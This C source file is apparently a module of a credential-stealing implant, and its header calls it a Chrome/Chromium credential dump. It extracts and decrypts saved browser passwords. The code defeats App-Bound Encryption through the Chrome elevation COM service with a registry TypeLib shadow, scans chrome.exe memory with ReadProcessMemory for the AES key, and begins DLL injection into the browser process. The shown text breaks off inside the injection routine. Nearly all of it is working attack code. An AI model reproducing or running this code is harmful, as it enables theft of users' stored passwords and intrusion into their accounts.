/*
 * browser.c — Chrome/Chromium credential dump
 *
 * Extracts saved passwords from Chrome, Edge, Brave, Opera, Chromium.
 * - Decrypts master key via DPAPI (CryptUnprotectData, no IAT concern since
 *   crypt32 is already imported by other modules)
 * - Decrypts each password blob with AES-256-GCM (mbedTLS, already linked)
 * - Parses Login Data SQLite B-tree without external sqlite3 dependency
 */

#include "commands.h"
#include "crypto.h"
#include <windows.h>
#include <wincrypt.h>
#include <objbase.h>
#include <oleauto.h>
#include <mbedtls/gcm.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <tlhelp32.h>

/*
 * Chrome v20 injection helper DLL blob.
 * Built by `make chrome-helper`. If not yet generated, build it first:
 *   make chrome-helper && make standalone
 */
#ifdef __has_include
#  if __has_include("chrome_key_helper_blob.h")
#    include "chrome_key_helper_blob.h"
#    define HAVE_CHROME_INJECT 1
#  endif
#endif

/* ── byte utilities ──────────────────────────────────────────────────── */

static uint16_t _be16(const uint8_t *p)
{
    return (uint16_t)((p[0] << 8) | p[1]);
}

static uint32_t _be32(const uint8_t *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

/* ── SQLite varint ───────────────────────────────────────────────────── */

static int _sq_varint(const uint8_t *p, const uint8_t *end, uint64_t *v)
{
    uint64_t r = 0;
    int n = 0;
    while (p + n < end && n < 8)
    {
        uint8_t b = p[n++];
        r = (r << 7) | (b & 0x7f);
        if (!(b & 0x80))
        {
            *v = r;
            return n;
        }
    }
    if (p + n < end)
        r = (r << 8) | p[n++];
    *v = r;
    return n;
}

/* serial type → byte length of stored value */
static uint32_t _sq_slen(uint64_t t)
{
    if (t == 0)
        return 0;
    if (t <= 4)
        return (uint32_t)t;
    if (t == 5)
        return 6;
    if (t == 6)
        return 8;
    if (t == 7)
        return 8;
    if (t == 8 || t == 9)
        return 0;
    if (t >= 12 && !(t & 1))
        return (uint32_t)((t - 12) / 2);
    if (t >= 13 && (t & 1))
        return (uint32_t)((t - 13) / 2);
    return 0;
}

/* ── IElevator COM interface (Chrome App-Bound Encryption, v127+) ────── */

typedef struct {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(void*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(void*);
    ULONG   (STDMETHODCALLTYPE *Release)(void*);
    /* RunRecoveryCRXElevated — index 3 */
    HRESULT (STDMETHODCALLTYPE *RunRecoveryCRXElevated)(void*, const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*);
    /* EncryptData — index 4 */
    HRESULT (STDMETHODCALLTYPE *EncryptData)(void*, DWORD, BSTR, BSTR*, DWORD*);
    /* DecryptData — index 5 */
    HRESULT (STDMETHODCALLTYPE *DecryptData)(void*, BSTR, BSTR*, DWORD*);
} _IElevatorVtbl;
typedef struct { _IElevatorVtbl *lpVtbl; } _IElevator;

/* one entry per Chrome channel (Stable/Beta/Dev/Canary) */
static const struct {
    CLSID clsid;
    IID   iid;
} s_elevators[] = {
    /* Chrome Stable v130+ — IElevator2Chrome (new IID per Chrome update) */
    { {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}} },
    /* Chrome Stable v127-129 — IElevatorChrome (legacy IID) */
    { {0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}},
      {0x463ABECF,0x410D,0x407F,{0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8}} },
    /* Chrome Beta */
    { {0xDD2D3AC8,0x2CDB,0x4399,{0x8F,0x7B,0x5C,0x09,0xB7,0xA7,0xC7,0xBC}},
      {0xA2721D66,0x376E,0x4D2F,{0x9F,0x0F,0x90,0x70,0xE9,0xA4,0x2B,0x5F}} },
    /* Chrome Dev */
    { {0xDA6F39E5,0x2DF0,0x4A23,{0x8E,0x5A,0xBC,0x2E,0x79,0xB6,0x7B,0x14}},
      {0xBB2AA26B,0x343A,0x4072,{0x8B,0x6F,0x80,0x55,0x7B,0x8C,0xE5,0x71}} },
    /* Chrome Canary */
    { {0x704C2872,0x2049,0x435E,{0xA4,0x69,0xB5,0x36,0xB4,0xF9,0x94,0x08}},
      {0x4F7CE041,0x28E9,0x484F,{0x9D,0xD0,0x61,0xA8,0xCA,0xCE,0xFE,0xE4}} },
    /* Microsoft Edge Stable */
    { {0x1FCBE96C,0x1697,0x43AF,{0x9C,0xEA,0x24,0xD7,0xD8,0x61,0xD4,0x5B}},
      {0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x78,0x59,0x43,0xF2}} },
};

/*
 * The TypeLib registration for IElevator (used by OLE Automation proxy/stub)
 * points to the Chrome version that was current at install time. After a Chrome
 * update the old path is deleted, leaving a stale entry and causing
 * CoCreateInstance to fail with TYPE_E_CANTLOADLIBRARY (0x80029C4A).
 * Fix: write the current elevation_service.exe path into a volatile HKCU key
 * that shadows the stale HKLM entry, then clean up after the call.
 */
static void _find_elevation_svc(char *out, size_t outsz)
{
    char appdir[MAX_PATH];
    ExpandEnvironmentStringsA("%ProgramFiles%\\Google\\Chrome\\Application",
                               appdir, sizeof(appdir));
    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", appdir);

    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;

    char best_ver[64] = {0};
    char best_path[MAX_PATH] = {0};
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (!isdigit((unsigned char)fd.cFileName[0])) continue;
        char svc[MAX_PATH];
        snprintf(svc, sizeof(svc), "%s\\%s\\elevation_service.exe",
                 appdir, fd.cFileName);
        if (GetFileAttributesA(svc) == INVALID_FILE_ATTRIBUTES) continue;
        if (strcmp(fd.cFileName, best_ver) > 0) {
            strncpy(best_ver, fd.cFileName, sizeof(best_ver) - 1);
            strncpy(best_path, svc, sizeof(best_path) - 1);
        }
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);

    if (best_path[0]) strncpy(out, best_path, outsz - 1);
}

/* IElevator TypeLib GUID == its IID for Chrome Stable */
static const char *_ELEV_TYPELIB_GUID =
    "{463ABECF-410D-407F-8AF5-0DF35A005CC8}";

static void _fix_elevator_typelib(const char *svc_path)
{
    char key[256];
    HKEY hk;
    static const char *arches[] = {"win64", "win32", NULL};
    for (int a = 0; arches[a]; a++) {
        snprintf(key, sizeof(key),
                 "SOFTWARE\\Classes\\TypeLib\\%s\\1.0\\0\\%s",
                 _ELEV_TYPELIB_GUID, arches[a]);
        if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
                            REG_OPTION_VOLATILE, KEY_SET_VALUE,
                            NULL, &hk, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hk, NULL, 0, REG_SZ,
                           (const BYTE *)svc_path,
                           (DWORD)(strlen(svc_path) + 1));
            RegCloseKey(hk);
        }
    }
}

static void _cleanup_elevator_typelib(void)
{
    char key[256];
    static const char *arches[] = {"win64", "win32", NULL};
    for (int a = 0; arches[a]; a++) {
        snprintf(key, sizeof(key),
                 "SOFTWARE\\Classes\\TypeLib\\%s\\1.0\\0\\%s",
                 _ELEV_TYPELIB_GUID, arches[a]);
        RegDeleteKeyA(HKEY_CURRENT_USER, key);
    }
    snprintf(key, sizeof(key),
             "SOFTWARE\\Classes\\TypeLib\\%s\\1.0\\0", _ELEV_TYPELIB_GUID);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    snprintf(key, sizeof(key),
             "SOFTWARE\\Classes\\TypeLib\\%s\\1.0", _ELEV_TYPELIB_GUID);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
    snprintf(key, sizeof(key),
             "SOFTWARE\\Classes\\TypeLib\\%s", _ELEV_TYPELIB_GUID);
    RegDeleteKeyA(HKEY_CURRENT_USER, key);
}

/* call Chrome elevation service to decrypt app-bound blob → raw key bytes */
static int _elevator_decrypt(const uint8_t *in, DWORD in_len,
                               uint8_t **out, size_t *out_len)
{
    /* Fix stale TypeLib path before any COM calls */
    char svc_path[MAX_PATH] = {0};
    _find_elevation_svc(svc_path, sizeof(svc_path));
    if (svc_path[0]) _fix_elevator_typelib(svc_path);

    HRESULT hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    int ok = 0;
    for (int i = 0; i < (int)(sizeof(s_elevators)/sizeof(s_elevators[0])); i++) {
        _IElevator *pElev = NULL;
        HRESULT hr = CoCreateInstance(&s_elevators[i].clsid, NULL,
                                       CLSCTX_LOCAL_SERVER,
                                       &s_elevators[i].iid,
                                       (void**)&pElev);
        if (FAILED(hr) || !pElev) continue;

        /* Set proxy blanket: impersonation + dynamic cloaking so the service
           sees this thread's token rather than the process token. */
        CoSetProxyBlanket((IUnknown *)pElev,
                          0xFFFFFFFFUL,   /* RPC_C_AUTHN_DEFAULT */
                          0xFFFFFFFFUL,   /* RPC_C_AUTHZ_DEFAULT */
                          NULL,
                          6,             /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */
                          3,             /* RPC_C_IMP_LEVEL_IMPERSONATE */
                          NULL,
                          0x40);         /* EOAC_DYNAMIC_CLOAKING */

        BSTR bstr_in = SysAllocStringByteLen((const char*)in, in_len);
        if (!bstr_in) { pElev->lpVtbl->Release(pElev); continue; }

        BSTR bstr_out = NULL;
        DWORD last_err = 0;
        hr = pElev->lpVtbl->DecryptData(pElev, bstr_in, &bstr_out, &last_err);
        SysFreeString(bstr_in);
        pElev->lpVtbl->Release(pElev);

        if (SUCCEEDED(hr) && bstr_out) {
            UINT blen = SysStringByteLen(bstr_out);
            *out = (uint8_t*)malloc(blen + 1);
            if (*out) {
                memcpy(*out, bstr_out, blen);
                (*out)[blen] = 0;
                *out_len = blen;
                ok = 1;
            }
            SysFreeString(bstr_out);
            if (ok) break;
        }
        if (bstr_out) SysFreeString(bstr_out);
    }

    if (hr_init != RPC_E_CHANGED_MODE) CoUninitialize();
    if (svc_path[0]) _cleanup_elevator_typelib();
    return ok ? 0 : -1;
}

/* read app_bound_encrypted_key from Local State, decrypt via elevation service */
static int _get_v20_master_key(const char *user_data_dir, uint8_t key_out[32])
{
    char ls[MAX_PATH];
    snprintf(ls, sizeof(ls), "%s\\Local State", user_data_dir);

    size_t sz = 0;
    uint8_t *raw = NULL;
    {
        HANDLE h = CreateFileA(ls, GENERIC_READ,
                                FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (h == INVALID_HANDLE_VALUE) return -1;
        LARGE_INTEGER li = {0}; GetFileSizeEx(h, &li);
        if (li.QuadPart > 0 && li.QuadPart <= 128*1024*1024) {
            raw = (uint8_t*)malloc((size_t)li.QuadPart + 1);
            if (raw) { DWORD rd=0; ReadFile(h, raw, (DWORD)li.QuadPart, &rd, NULL); raw[rd]=0; sz=rd; }
        }
        CloseHandle(h);
    }
    if (!raw) return -1;

    /* find "app_bound_encrypted_key":"<b64>" */
    const char needle[] = "\"app_bound_encrypted_key\":\"";
    char *p = strstr((char*)raw, needle);
    int rc = -1;
    if (p) {
        p += sizeof(needle) - 1;
        char *q = strchr(p, '"');
        if (q) {
            char *b64 = (char*)malloc((size_t)(q-p)+1);
            if (b64) {
                memcpy(b64, p, (size_t)(q-p)); b64[q-p] = 0;
                size_t enc_len = 0;
                uint8_t *enc = base64_decode(b64, &enc_len);
                free(b64);
                if (enc) {
                    uint8_t *dec = NULL; size_t dec_len = 0;
                    if (_elevator_decrypt(enc, (DWORD)enc_len, &dec, &dec_len) == 0) {
                        /* service returns raw 32-byte key, possibly with version prefix */
                        if (dec_len >= 32) {
                            /* take last 32 bytes in case of version prefix */
                            memcpy(key_out, dec + dec_len - 32, 32);
                            rc = 0;
                        }
                        SecureZeroMemory(dec, dec_len); free(dec);
                    }
                    SecureZeroMemory(enc, enc_len); free(enc);
                }
            }
        }
    }
    free(raw);
    return rc;
}

/* ── DPAPI decrypt ───────────────────────────────────────────────────── */

static int _dpapi_dec(const uint8_t *in, size_t in_len,
                      uint8_t **out, size_t *out_len)
{
    DATA_BLOB ib = {(DWORD)in_len, (BYTE *)(uintptr_t)in};
    DATA_BLOB ob = {0, NULL};
    if (!CryptUnprotectData(&ib, NULL, NULL, NULL, NULL, 0, &ob))
        return -1;
    *out = (uint8_t *)malloc(ob.cbData + 1);
    if (!*out)
    {
        LocalFree(ob.pbData);
        return -1;
    }
    memcpy(*out, ob.pbData, ob.cbData);
    (*out)[ob.cbData] = 0;
    *out_len = ob.cbData;
    LocalFree(ob.pbData);
    return 0;
}

/* ── AES-256-GCM decrypt (mbedTLS 3.x) ──────────────────────────────── */

static int _aes_gcm_dec(const uint8_t *key,
                        const uint8_t *nonce, size_t nonce_len,
                        const uint8_t *ct, size_t ct_len,
                        const uint8_t *expected_tag,
                        uint8_t *pt)
{
    mbedtls_gcm_context ctx;
    mbedtls_gcm_init(&ctx);

    int ret = mbedtls_gcm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key, 256);
    if (ret)
    {
        mbedtls_gcm_free(&ctx);
        return -1;
    }

    ret = mbedtls_gcm_starts(&ctx, MBEDTLS_GCM_DECRYPT, nonce, nonce_len);
    if (ret)
    {
        mbedtls_gcm_free(&ctx);
        return -1;
    }

    size_t olen = 0;
    ret = mbedtls_gcm_update(&ctx, ct, ct_len, pt, ct_len + 16, &olen);
    if (ret)
    {
        mbedtls_gcm_free(&ctx);
        return -1;
    }

    uint8_t tag_buf[16] = {0};
    size_t olen2 = 0;
    mbedtls_gcm_finish(&ctx, NULL, 0, &olen2, tag_buf, 16);
    mbedtls_gcm_free(&ctx);

    if (memcmp(tag_buf, expected_tag, 16) != 0)
        return -1;
    return 0;
}

/* ── file I/O ────────────────────────────────────────────────────────── */

/* read whole file; caller frees */
static uint8_t *_read_file(const char *path, size_t *sz)
{
    HANDLE h = CreateFileA(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return NULL;
    LARGE_INTEGER li = {0};
    GetFileSizeEx(h, &li);
    if (li.QuadPart <= 0 || li.QuadPart > 128 * 1024 * 1024)
    {
        CloseHandle(h);
        return NULL;
    }
    uint8_t *buf = (uint8_t *)malloc((size_t)li.QuadPart + 1);
    if (!buf)
    {
        CloseHandle(h);
        return NULL;
    }
    DWORD rd = 0;
    ReadFile(h, buf, (DWORD)li.QuadPart, &rd, NULL);
    CloseHandle(h);
    buf[rd] = 0;
    *sz = (size_t)rd;
    return buf;
}

/* copy file to %TEMP%\~brXXXX.tmp to bypass Chrome's lock */
static int _copy_to_temp(const char *src, char *tmp_path, size_t tmp_sz)
{
    char tmp[MAX_PATH];
    GetTempPathA(sizeof(tmp), tmp);
    snprintf(tmp_path, tmp_sz, "%s~br%08lx.tmp", tmp,
             (unsigned long)GetTickCount());
    return CopyFileA(src, tmp_path, FALSE) ? 0 : -1;
}

/* ── Chrome master key ───────────────────────────────────────────────── */

/* extract AES-256 master key from "Local State" (Chrome v80+)
   returns 0 on success, writes 32 bytes to key_out */
static int _get_master_key(const char *user_data_dir, uint8_t key_out[32])
{
    char ls[MAX_PATH];
    snprintf(ls, sizeof(ls), "%s\\Local State", user_data_dir);

    size_t sz = 0;
    uint8_t *raw = _read_file(ls, &sz);
    if (!raw)
        return -1;

    /* locate "encrypted_key":"<b64>" in the JSON */
    const char needle[] = "\"encrypted_key\":\"";
    char *p = strstr((char *)raw, needle);
    if (!p)
    {
        free(raw);
        return -1;
    }
    p += sizeof(needle) - 1;
    char *q = strchr(p, '"');
    if (!q)
    {
        free(raw);
        return -1;
    }

    char *b64 = (char *)malloc((size_t)(q - p) + 1);
    if (!b64)
    {
        free(raw);
        return -1;
    }
    memcpy(b64, p, (size_t)(q - p));
    b64[q - p] = 0;
    free(raw);

    size_t enc_len = 0;
    uint8_t *enc = base64_decode(b64, &enc_len);
    free(b64);
    if (!enc)
        return -1;

    int rc = -1;
    /* "DPAPI" magic prefix (5 bytes) */
    if (enc_len > 5 && memcmp(enc, "DPAPI", 5) == 0)
    {
        uint8_t *dec = NULL;
        size_t dec_len = 0;
        if (_dpapi_dec(enc + 5, enc_len - 5, &dec, &dec_len) == 0 &&
            dec_len == 32)
        {
            memcpy(key_out, dec, 32);
            rc = 0;
        }
        if (dec)
        {
            SecureZeroMemory(dec, dec_len);
            free(dec);
        }
    }
    SecureZeroMemory(enc, enc_len);
    free(enc);
    return rc;
}

/* ── password blob decryption ────────────────────────────────────────── */

/* same AES-GCM layout for v10/v11/v20: prefix(3) + nonce(12) + ct + tag(16) */
static int _decrypt_gcm_blob(const uint8_t *key, const uint8_t *blob,
                               size_t blob_len, char *out, size_t outsz)
{
    if (blob_len < 3 + 12 + 16) return -1;
    const uint8_t *nonce = blob + 3;
    const uint8_t *ct    = blob + 3 + 12;
    size_t ct_len        = blob_len - 3 - 12 - 16;
    const uint8_t *tag   = blob + blob_len - 16;

    if (ct_len == 0) { out[0] = 0; return 0; }

    uint8_t *pt = (uint8_t*)malloc(ct_len + 1);
    if (!pt) return -1;
    int r = _aes_gcm_dec(key, nonce, 12, ct, ct_len, tag, pt);
    if (r == 0) { pt[ct_len] = 0; snprintf(out, outsz, "%.*s", (int)ct_len, (char*)pt); }
    SecureZeroMemory(pt, ct_len);
    free(pt);
    return r;
}

static int _decrypt_pw(const uint8_t *mk,    int have_mk,
                       const uint8_t *v20mk, int have_v20mk,
                       const uint8_t *blob,  size_t blob_len,
                       char *out, size_t outsz)
{
    if (!blob || blob_len == 0) return -1;

    if (blob_len > 3 && (memcmp(blob, "v10", 3) == 0 || memcmp(blob, "v11", 3) == 0)) {
        if (!have_mk) return -1;
        return _decrypt_gcm_blob(mk, blob, blob_len, out, outsz);
    }

    if (blob_len > 3 && memcmp(blob, "v20", 3) == 0) {
        if (!have_v20mk) return -1;
        return _decrypt_gcm_blob(v20mk, blob, blob_len, out, outsz);
    }

    /* legacy: DPAPI-encrypted blob (pre-Chrome 80) */
    uint8_t *dec = NULL; size_t dec_len = 0;
    if (_dpapi_dec(blob, blob_len, &dec, &dec_len) != 0) return -1;
    snprintf(out, outsz, "%.*s", (int)dec_len, (char*)dec);
    SecureZeroMemory(dec, dec_len); free(dec);
    return 0;
}

/* ── minimal SQLite B-tree reader ────────────────────────────────────── */

typedef struct
{
    const uint8_t *data;
    size_t size;
    uint32_t page_size;
} _sq_db_t;

static const uint8_t *_sq_page(const _sq_db_t *db, uint32_t pgno)
{
    if (pgno == 0)
        return NULL;
    uint64_t off = (uint64_t)(pgno - 1) * db->page_size;
    if (off + db->page_size > db->size)
        return NULL;
    return db->data + (size_t)off;
}

#define SQ_MAX_COLS 32

typedef struct
{
    uint64_t type[SQ_MAX_COLS];
    const uint8_t *val[SQ_MAX_COLS];
    uint32_t len[SQ_MAX_COLS];
    int n;
} _sq_row_t;

typedef void (*_sq_cb)(void *, const _sq_row_t *);

/* parse one leaf page and call cb for each record */
static void _sq_leaf(const _sq_db_t *db,
                     const uint8_t *page, int is_p1,
                     _sq_cb cb, void *cbctx)
{
    int hdr_off = is_p1 ? 100 : 0;
    const uint8_t *h = page + hdr_off;
    if (h[0] != 0x0D)
        return; /* must be leaf table page */

    uint16_t n_cells = _be16(h + 3);
    const uint8_t *arr = h + 8;
    const uint8_t *pend = page + db->page_size;

    for (uint16_t i = 0; i < n_cells; i++)
    {
        if (arr + i * 2 + 1 >= pend)
            break;
        uint16_t off = _be16(arr + i * 2);
        if (off < (uint16_t)hdr_off || off + 2 >= db->page_size)
            continue;
        const uint8_t *c = page + off;

        uint64_t payload_len = 0, rowid = 0;
        int n = _sq_varint(c, pend, &payload_len);
        if (n <= 0)
            continue;
        c += n;
        n = _sq_varint(c, pend, &rowid);
        if (n <= 0)
            continue;
        c += n;

        /* inline payload (no overflow pages for Login Data rows) */
        const uint8_t *payload = c;
        if (payload + payload_len > pend)
            continue;

        uint64_t hdr_sz = 0;
        n = _sq_varint(payload, payload + payload_len, &hdr_sz);
        if (n <= 0 || hdr_sz > payload_len || hdr_sz < (uint64_t)n)
            continue;

        const uint8_t *tp = payload + n;
        const uint8_t *hend = payload + hdr_sz;
        const uint8_t *vp = payload + hdr_sz;

        _sq_row_t row;
        row.n = 0;

        while (tp < hend && row.n < SQ_MAX_COLS)
        {
            uint64_t t = 0;
            n = _sq_varint(tp, hend, &t);
            if (n <= 0)
                break;
            tp += n;
            uint32_t vlen = _sq_slen(t);
            if (vp + vlen > payload + payload_len)
                break;
            row.type[row.n] = t;
            row.val[row.n] = vp;
            row.len[row.n] = vlen;
            row.n++;
            vp += vlen;
        }

        if (row.n > 0)
            cb(cbctx, &row);
    }
}

/* recursive B-tree walk */
static void _sq_walk(const _sq_db_t *db, uint32_t pgno, int depth,
                     _sq_cb cb, void *cbctx)
{
    if (depth > 20)
        return;
    const uint8_t *page = _sq_page(db, pgno);
    if (!page)
        return;

    int is_p1 = (pgno == 1);
    int hdr_off = is_p1 ? 100 : 0;
    const uint8_t *h = page + hdr_off;

    if (h[0] == 0x05)
    {
        /* interior page: walk left children then right-most */
        uint16_t n_cells = _be16(h + 3);
        uint32_t right = _be32(h + 8);
        const uint8_t *arr = h + 12;
        const uint8_t *pend = page + db->page_size;

        for (uint16_t i = 0; i < n_cells; i++)
        {
            if (arr + i * 2 + 1 >= pend)
                break;
            uint16_t coff = _be16(arr + i * 2);
            if (coff < (uint16_t)hdr_off + 4 || coff >= db->page_size)
                continue;
            uint32_t child = _be32(page + coff);
            _sq_walk(db, child, depth + 1, cb, cbctx);
        }
        _sq_walk(db, right, depth + 1, cb, cbctx);
    }
    else if (h[0] == 0x0D)
    {
        _sq_leaf(db, page, is_p1, cb, cbctx);
    }
}

/* ── sqlite_master scan to find logins rootpage ──────────────────────── */

typedef struct
{
    const char *tbl;
    uint32_t rootpage;
} _sq_find_t;

static void _sq_find_cb(void *ctx_, const _sq_row_t *row)
{
    _sq_find_t *f = (_sq_find_t *)ctx_;
    if (f->rootpage)
        return;
    if (row->n < 4)
        return;

    /* col 0: type TEXT must be "table" */
    if (!(row->type[0] >= 13 && (row->type[0] & 1)))
        return;
    if (row->len[0] != 5 || memcmp(row->val[0], "table", 5) != 0)
        return;

    /* col 1: name TEXT must match */
    if (!(row->type[1] >= 13 && (row->type[1] & 1)))
        return;
    size_t nlen = strlen(f->tbl);
    if (row->len[1] != (uint32_t)nlen ||
        memcmp(row->val[1], f->tbl, nlen) != 0)
        return;

    /* col 3: rootpage INTEGER */
    uint64_t t = row->type[3];
    if (t < 1 || t > 9)
        return;
    uint32_t rp = 0;
    uint32_t vlen = row->len[3];
    for (uint32_t i = 0; i < vlen; i++)
        rp = (rp << 8) | row->val[3][i];
    f->rootpage = rp;
}

/* ── Chrome memory scan for v20 AES master key ───────────────────────── */

typedef struct {
    int      found;
    uint8_t  nonce[12];
    uint8_t  ct[512];
    size_t   ct_len;
    uint8_t  tag[16];
} _v20_hint_t;

/* collect first v20 blob we find — used as oracle for memory scan */
static void _v20_hint_cb(void *ctx_, const _sq_row_t *row)
{
    _v20_hint_t *h = (_v20_hint_t *)ctx_;
    if (h->found || row->n < 6) return;
    if (row->len[5] < 3 + 12 + 1 + 16) return;
    if (memcmp(row->val[5], "v20", 3) != 0) return;
    size_t ct_len = row->len[5] - 3 - 12 - 16;
    if (ct_len == 0 || ct_len > sizeof(h->ct)) return;
    memcpy(h->nonce, row->val[5] + 3,           12);
    memcpy(h->ct,    row->val[5] + 3 + 12,      ct_len);
    memcpy(h->tag,   row->val[5] + row->len[5] - 16, 16);
    h->ct_len = ct_len;
    h->found  = 1;
}

/* extract one v20 blob from Login Data for use as key-search oracle */
static int _extract_v20_hint(const char *db_path, _v20_hint_t *hint)
{
    char tmp[MAX_PATH] = {0};
    if (_copy_to_temp(db_path, tmp, sizeof(tmp)) != 0) return -1;

    size_t db_sz = 0;
    uint8_t *db_data = _read_file(tmp, &db_sz);
    DeleteFileA(tmp);
    if (!db_data) return -1;

    if (db_sz < 100 || memcmp(db_data, "SQLite format 3\000", 16) != 0) {
        free(db_data); return -1;
    }

    _sq_db_t db;
    db.data = db_data; db.size = db_sz;
    uint16_t pgsz = _be16(db_data + 16);
    db.page_size = (pgsz == 1) ? 65536u : (uint32_t)pgsz;
    if (db.page_size < 512 || db.page_size > 65536) { free(db_data); return -1; }

    _sq_find_t find = {"logins", 0};
    _sq_walk(&db, 1, 0, _sq_find_cb, &find);
    if (find.rootpage) {
        hint->found = 0;
        _sq_walk(&db, find.rootpage, 0, _v20_hint_cb, hint);
    }
    free(db_data);
    return hint->found ? 0 : -1;
}

/*
 * Scan READWRITE pages of all chrome.exe processes for a 32-byte AES-256 key.
 * Use a known (nonce, ct, tag) triplet from a v20 blob as oracle:
 * try each 16-byte-aligned candidate key, accept on GCM tag match.
 */
static int _scan_chrome_memory(const _v20_hint_t *hint, const char *proc_name,
                               uint8_t key_out[32])
{
    if (!hint->found || hint->ct_len == 0) return -1;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return -1;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    int found = -1;

    if (!Process32First(snap, &pe)) { CloseHandle(snap); return -1; }

    uint8_t *rbuf = NULL;
    size_t   rcap = 0;
    uint8_t  pt[512];

    do {
        if (_stricmp(pe.szExeFile, proc_name) != 0) continue;

        HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                                FALSE, pe.th32ProcessID);
        if (!hp) continue;

        MEMORY_BASIC_INFORMATION mbi;
        uint8_t *addr = NULL;

        while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            addr = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;

            if (mbi.State != MEM_COMMIT) continue;
            if (!(mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE))) continue;
            if (mbi.RegionSize < 32 || mbi.RegionSize > 64 * 1024 * 1024) continue;

            if (mbi.RegionSize > rcap) {
                free(rbuf);
                rbuf = (uint8_t *)malloc(mbi.RegionSize);
                rcap = rbuf ? mbi.RegionSize : 0;
            }
            if (!rbuf) continue;

            SIZE_T rd = 0;
            if (!ReadProcessMemory(hp, mbi.BaseAddress, rbuf, mbi.RegionSize, &rd)) continue;
            if (rd < 32) continue;

            for (size_t off = 0; off + 32 <= rd; off += 8) {
                if (_aes_gcm_dec(rbuf + off,
                                 hint->nonce, 12,
                                 hint->ct, hint->ct_len,
                                 hint->tag, pt) == 0) {
                    memcpy(key_out, rbuf + off, 32);
                    found = 0;
                    CloseHandle(hp);
                    goto scan_done;
                }
            }
        }
        CloseHandle(hp);
    } while (Process32Next(snap, &pe));

scan_done:
    free(rbuf);
    CloseHandle(snap);
    return found;
}

/* ── Chrome injection fallback (Chrome 130+, BCrypt-protected key) ────── */
/*
 * When Chrome 130+ protects the AES key with BCryptProtectMemory
 * (SAME_PROCESS), ReadProcessMemory reads the encrypted form and the
 * external memory scan fails.  Solution: inject a helper DLL into the
 * Chrome BROWSER process (which has no ACG and no CIG on Chrome 150) so
 * BCryptUnprotectMemory can run from inside the correct security context.
 *
 * Requires HAVE_CHROME_INJECT (built by `make chrome-helper`).
 */
#ifdef HAVE_CHROME_INJECT

/* Shared memory layout — must match chrome_key_helper.c exactly */
#define _CHROME_SHM_MAGIC 0xCEC0FFEE
#pragma pack(push, 1)
typedef struct {
    uint32_t magic;
    uint8_t  nonce[12];
    uint8_t  ct[512];
    uint32_t ct_len;
    uint8_t  tag[16];
    volatile int   found;
    uint8_t        key[32];
    volatile int32_t dbg_pages;
    volatile int32_t dbg_unprotect_ok;
    volatile int32_t dbg_gcm_tried;
} _chrome_shm_t;
#pragma pack(pop)

/*
 * Find the Chrome browser process: the chrome.exe with the largest
 * committed READWRITE footprint (browser process >> renderers).
 * Returns 0 if no Chrome is running.
 */
static DWORD _find_browser_pid(const char *proc_name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    DWORD best_pid = 0;
    SIZE_T best_bytes = 0;

    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, proc_name) != 0) continue;
        HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                FALSE, pe.th32ProcessID);
        if (!hp) continue;

        SIZE_T total = 0;
        MEMORY_BASIC_INFORMATION mbi;
        uint8_t *addr = NULL;
        while (VirtualQueryEx(hp, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            addr = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;
            if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE))
                total += mbi.RegionSize;
        }
        CloseHandle(hp);

        if (total > best_bytes) { best_bytes = total; best_pid = pe.th32ProcessID; }
    } while (Process32Next(snap, &pe));

    CloseHandle(snap);
    return best_pid;
}

/*
 * Inject chrome_key_helper.dll into the Chrome browser process.
 * Fills key_out[32] on success, returns 0; -1 on failure.
 */
static int _inject_v20_chrome(DWORD chrome_pid, const _v20_hint_t *hint,
                               uint8_t key_out[32])
{
